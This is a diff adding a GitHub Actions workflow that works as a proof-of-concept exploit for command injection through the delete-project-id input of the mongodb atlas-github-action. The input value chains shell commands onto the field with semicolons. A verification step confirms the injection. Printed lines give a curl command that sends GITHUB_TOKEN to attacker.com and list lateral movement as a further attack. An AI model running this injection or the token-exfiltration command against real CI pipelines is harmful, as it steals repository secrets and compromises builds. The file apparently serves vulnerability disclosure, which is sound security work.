@@ -1,0 +1,48 @@
+name: POC - Command Injection via delete-project-id
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: POC - Command Injection via delete-project-id
+        uses: mongodb/atlas-github-action@v0.2.0
+        with:
+          # This demonstrates command injection - the semicolon allows command chaining
+          # The injected command will execute BEFORE the atlas command fails
+          delete-project-id: "fake-project-id; echo '🚨 COMMAND INJECTION SUCCESSFUL 🚨' > /tmp/poc-success.txt; echo 'Injected command executed!' && id && whoami && pwd"
+          delete-cluster-name: "any-cluster-name"
+
+      - name: Verify Injection
+        shell: bash
+        run: |
+          if [ -f /tmp/poc-success.txt ]; then
+            echo "✅ VULNERABILITY CONFIRMED: Command injection successful!"
+            cat /tmp/poc-success.txt
+            echo ""
+            echo "The injected commands executed, proving the vulnerability."
+          else
+            echo "❌ Injection may have failed or file was not created"
+          fi
+
+      - name: Show Environment Info (Demonstrates Access)
+        shell: bash
+        run: |
+          echo "This demonstrates that injected commands have access to:"
+          echo "- Environment variables"
+          echo "- File system"
+          echo "- Network (could exfiltrate secrets)"
+          echo ""
+          echo "In a real attack, an attacker could:"
+          echo "  - Exfiltrate GITHUB_TOKEN: curl https://attacker.com?token=\$GITHUB_TOKEN"
+          echo "  - Access repository secrets"
+          echo "  - Modify artifacts"
+          echo "  - Perform lateral movement"
